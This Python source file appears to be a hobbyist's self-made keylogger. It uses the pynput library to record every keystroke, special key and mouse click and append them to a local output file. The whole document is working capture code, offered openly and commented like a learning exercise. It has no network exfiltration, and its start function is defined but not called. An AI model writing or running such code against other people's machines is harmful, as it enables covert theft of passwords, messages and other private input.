from pynput import keyboard, mouse
import os

def on_press(key):
    try:
        # dont use exit(1) or exit(0) ==> it will just type ctrl , infinite loop 
        if key.char == '\x03':  # ASCII code for Ctrl + C
            os._exit(1)
                    
        else:
            # a is append mode , as normal keys, dont use w-write  here , it will not create same 
            # duplicate file , and write the keys   
            with open(output_file_path, 'a') as f:
                f.write(str(key.char) + '\n')
                
    except AttributeError:
        print("attribute error ")
             
        # handle functional keys, special keys here like f1 - f12 , 
        # special keys, including Ctrl and Alt and Shift
        if key in [ 
            keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, keyboard.Key.f4,
            keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8,
            keyboard.Key.f9, keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12, 
            keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
            keyboard.Key.shift_l, keyboard.Key.shift_r, keyboard.Key.tab, keyboard.Key.delete,
            keyboard.Key.home, keyboard.Key.end, keyboard.Key.page_down, keyboard.Key.page_up,
            keyboard.Key.insert, keyboard.Key.backspace, keyboard.Key.scroll_lock, 
            keyboard.Key.print_screen, keyboard.Key.pause, keyboard.Key.esc, keyboard.Key.enter, 
            keyboard.Key.num_lock, keyboard.Key.caps_lock, keyboard.Key.cmd, keyboard.Key.menu 
            ]:
            # u cannot target hardware key -> fn(function)
                
            with open(output_file_path, 'a') as f:
                f.write(f"[{key.name}]" + '\n')
                
# to handle mouse events  
def on_mouse_click(x, y, button, pressed):
    print("MOUSE CLICK KEYLOGGER")    
    mouse_event = f"Mouse click at ({x}, {y}) with button {button} {'pressed' if pressed else 'released'}"
    with open(output_file_path, 'a') as f:
        f.write(mouse_event + '\n')
        
# start the keylogger , without this , the program gives error 
def start_keylogger():
    print("KeyLogger Started \n Connecting... ")
    print("Listening , plz keep on typing, \n If you wish to quit the keyLogger , press ctrl + C ")
    
    # call the onpress function to store it in a file - to view ,  \ => break a single line into 
    # multiple , but it is actually a single line to executed  
    with keyboard.Listener(on_press=on_press) as key_listener, \
         mouse.Listener(on_click=on_mouse_click) as mouse_listener:
        key_listener.join()
        mouse_listener.join()
        
# output.txt should exist 
output_file_path = 'C:\\Program Files\\PYTHON\\HackingSelfMadeTools\\webpentester\\output.txt'